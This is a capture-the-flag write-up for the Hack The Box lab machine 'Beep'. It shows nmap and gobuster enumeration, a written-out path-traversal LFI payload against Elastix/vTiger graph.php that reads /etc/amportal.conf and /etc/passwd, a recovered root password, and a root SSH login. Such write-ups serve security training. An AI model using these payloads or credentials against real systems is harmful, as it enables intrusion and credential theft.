# Beep

**Machine ip:** 10.10.10.7

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.7 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.7`
```
└─$ sudo nmap -n -Pn -sV -sC -p$ports 10.10.10.7
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 13:18 +03
WARNING: Duplicate port number(s) specified.  Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).
Nmap scan report for 10.10.10.7
Host is up (0.11s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: PIPELINING USER RESP-CODES EXPIRE(NEVER) AUTH-RESP-CODE IMPLEMENTATION(Cyrus POP3 server v2) APOP TOP LOGIN-DELAY(0) STLS UIDL
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            790/udp   status
|_  100024  1            793/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: CONDSTORE RENAME OK CHILDREN LISTEXT CATENATE IMAP4rev1 MAILBOX-REFERRALS LIST-SUBSCRIBED X-NETSCAPE NO STARTTLS Completed URLAUTHA0001 ANNOTATEMORE BINARY THREAD=ORDEREDSUBJECT NAMESPACE SORT RIGHTS=kxte IDLE THREAD=REFERENCES UIDPLUS QUOTA LITERAL+ IMAP4 MULTIAPPEND UNSELECT ATOMIC ID SORT=MODSEQ ACL
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_http-server-header: Apache/2.2.3 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2024-01-08T06:21:32+00:00; +5s from scanner time.
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Elastix - Login page
793/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 389.49 seconds

```

+ Navigate to `https://10.10.10.7/`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8826721d-9e43-4f19-a2fb-28bae559dd17)

+ Directory fuzzing:
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.7/ -k
```

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.7/ -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/837bed63-aab3-4ba3-a404-325c94c17739)

+ `searchsploit elastix`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5a65eb4d-8714-475f-a9f6-9cae506cd456)

+ Navigate to `https://10.10.10.7/vtigercrm/`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/03b85b59-667c-43ca-b134-fc772537c2f8)

+ `searchsploit vtiger crm 5.1.0`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a9470a5b-52e2-4d9b-a204-b7bc268f5ce8)




## Exploitation
### 1.Solution:
+ **Elastix 2.2.0 - 'graph.php' Local File Inclusion:** [LFI](https://www.exploit-db.com/exploits/37637)
+ Exploit: `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
+ Navigate to:
```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/87307089-e37c-4265-8c39-915ac2a57034)

+ Users and passwords identified:
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/352c0043-3abf-48ff-bc04-d930166aa76f)

+ And also try:
```
view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5723c61c-8d7e-429e-862f-e94b5cbede3f)

+ **vTiger CRM 5.1.0 - Local File Inclusion:** [CVE-2012-4867](https://www.exploit-db.com/exploits/18770)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a549bf30-1da5-4ba7-89ae-2534fbe28e5e)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/232fb7bb-6a9f-4c13-851e-329aed2c0c3f)

+ Now there are enumerated users and passwords.

+ Login ssh using `root`:`jEhdIekWmdjE`: `ssh root@10.10.10.7`
+ If meet an error, check [1](https://www.iclarified.com/85252/how-to-fix-no-matching-key-exchange-method-found-on-mac) [2](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss)
+ Login `ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7`
+ Get root!
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cf306f2-3f06-4311-ba44-3fba99817893)

### 2.Solution:



# References & Alternatives:
+ https://vvmlist.github.io/#beep
+ https://0xdf.gitlab.io/2021/02/23/htb-beep.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/beep-writeup-w-o-metasploit
+ https://mertle.medium.com/write-up-htb-beep-9b4159ca3005
+ https://medium.com/@siddharth.singhal1995/hackthebox-walkthrough-beep-5-60e29ad0668a
+ https://www.siberportal.org/red-team/penetration-testing/hack-the-box-beep-cozumu/
